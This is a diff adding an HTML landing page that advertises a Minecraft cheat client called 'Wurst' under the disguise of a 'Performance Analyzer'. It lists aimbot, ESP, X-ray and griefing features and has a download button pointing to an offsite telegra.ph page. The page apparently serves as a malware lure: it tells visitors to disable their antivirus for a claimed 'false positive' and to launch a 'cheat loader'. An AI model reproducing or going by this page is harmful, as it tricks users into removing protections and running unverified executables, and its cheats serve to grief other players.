@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Wurst — Minecraft Performance Analyzer 2026</title>
+    <meta name="description" content="Wurst popular and beginner-friendly performance analyzer for Minecraft. Reliable aimbot, clear ESP, and extensive utility and griefing modules." />
+    <link rel="canonical" href="https://mc-analytics-tools.github.io/wurst/" />
+
+    <meta property="og:title" content="Wurst — Minecraft Performance Analyzer" />
+    <meta property="og:description" content="Popular and beginner-friendly performance analyzer with reliable aimbot for Minecraft." />
+    <meta property="og:url" content="https://mc-analytics-tools.github.io/wurst/" />
+    <meta property="og:type" content="website" />
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #0a0a0f;
+            color: #e0e0e0;
+            line-height: 1.6;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 860px;
+            width: 100%;
+            background: linear-gradient(145deg, #12121a, #1a1a24);
+            padding: 40px;
+            border-radius: 20px;
+            border: 1px solid #2a2a3a;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+        }
+        h1 {
+            font-size: 2.6rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #8b5cf6, #3b82f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #94a3b8;
+            font-size: 1.1rem;
+            margin-bottom: 24px;
+            border-left: 3px solid #8b5cf6;
+            padding-left: 16px;
+        }
+        .badge {
+            display: inline-block;
+            background: #8b5cf6;
+            color: #fff;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            margin-right: 8px;
+        }
+        .badge-green { background: #22c55e; }
+        .badge-blue { background: #3b82f6; }
+        .section { margin: 28px 0; }
+        .section h2 {
+            font-size: 1.4rem;
+            color: #e2e8f0;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        .feature-item {
+            background: #1e1e2a;
+            padding: 12px 16px;
+            border-radius: 10px;
+            border-left: 3px solid #8b5cf6;
+            font-size: 0.95rem;
+        }
+        .feature-item strong { color: #a78bfa; }
+        .btn-download {
+            display: inline-block;
+            background: linear-gradient(135deg, #8b5cf6, #3b82f6);
+            color: #fff;
+            padding: 16px 40px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.2rem;
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 8px 24px rgba(139, 92, 246, 0.3);
+            margin: 8px 0;
+        }
+        .btn-download:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 32px rgba(139, 92, 246, 0.5);
+        }
+        .disclaimer {
+            margin-top: 30px;
+            padding: 16px;
+            background: #1a1a2a;
+            border-radius: 10px;
+            font-size: 0.85rem;
+            color: #94a3b8;
+            border: 1px solid #2a2a3a;
+        }
+        .footer-meta {
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #475569;
+            text-align: center;
+            border-top: 1px solid #1e1e2a;
+            padding-top: 20px;
+        }
+        .tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 16px;
+        }
+        .tag {
+            background: #1e1e2a;
+            padding: 4px 12px;
+            border-radius: 16px;
+            font-size: 0.75rem;
+            color: #94a3b8;
+            border: 1px solid #2a2a3a;
+        }
+        .steps { color: #cbd5e1; padding-left: 20px; }
+        .steps li { margin-bottom: 6px; }
+        @media (max-width: 600px) {
+            .container { padding: 24px; }
+            h1 { font-size: 1.8rem; }
+            .feature-grid { grid-template-columns: 1fr; }
+            .btn-download { width: 100%; text-align: center; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ WURST</h1>
+        <div class="subtitle">
+            <span class="badge">ANALYZER</span>
+            <span class="badge badge-green">OPEN SOURCE</span>
+            <span class="badge badge-blue">MINECRAFT</span>
+            Performance Tool 2026
+        </div>
+
+        <div class="section">
+            <h2>📌 About the Tool</h2>
+            <p style="color: #cbd5e1;">Wurst is a popular and beginner-friendly performance analyzer for Minecraft, providing reliable aimbot, clear ESP, and extensive utility and griefing modules.</p>
+        </div>
+
+        <div class="section">
+            <h2>🎯 Key Features</h2>
+            <div class="feature-grid">
+                <div class="feature-item"><strong>Reliable Aimbot</strong> — Consistent and precise targeting</div>
+                <div class="feature-item"><strong>Clear ESP</strong> — Players and mobs revealed</div>
+                <div class="feature-item"><strong>Flight &amp; X-Ray</strong> — Essential movement and vision modules</div>
+                <div class="feature-item"><strong>Griefing Tools</strong> — Utility and destruction features</div>
+                <div class="feature-item"><strong>Simple Interface</strong> — Straightforward and easy to use</div>
+                <div class="feature-item"><strong>Consistent Updates</strong> — Reliable across Minecraft versions</div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>🖥️ System Requirements</h2>
+            <ul class="steps">
+                <li>Windows 10/11 (64-bit)</li>
+                <li>Modern GPU drivers (overlay support)</li>
+                <li>100 MB free disk space</li>
+                <li>Internet optional (for updates)</li>
+            </ul>
+        </div>
+
+        <div class="section" style="text-align: center;">
+            <h2>⬇️ Download</h2>
+            <p style="margin-bottom: 16px; color: #94a3b8;">Download the tool and follow the instructions inside.</p>
+            <a class="btn-download" href="https://telegra.ph/Wurst-Minecraft-Client-2026--Aimbot-ESP-X-Ray-Flight-Griefing-Hack-Free-07-10">⬇️ DOWNLOAD NOW</a>
+            <p style="margin-top: 12px; font-size: 0.8rem; color: #64748b;">⚠️ Disable antivirus temporarily (false positive)</p>
+        </div>
+
+        <div class="section">
+            <h2>📥 Installation</h2>
+            <ol class="steps">
+                <li>Launch the cheat loader</li>
+                <li>Start Minecraft</li>
+                <li>The sleek menu will appear automatically — ready for customization</li>
+            </ol>
+        </div>
+
+        <div class="section">
+            <div class="tags">
+                <span class="tag">minecraft analyzer</span>
+                <span class="tag">reliable aimbot</span>
+                <span class="tag">clear esp</span>
+                <span class="tag">griefing tools</span>
+            </div>
+        </div>
+
+        <div class="disclaimer">
+            ⚠️ <strong>Disclaimer:</strong> This tool is provided for educational and research purposes only. Users are responsible for compliance with applicable game policies.
+        </div>
+
+        <div class="footer-meta">Wurst — Minecraft Performance Analyzer 2026</div>
+    </div>
+</body>
+</html>
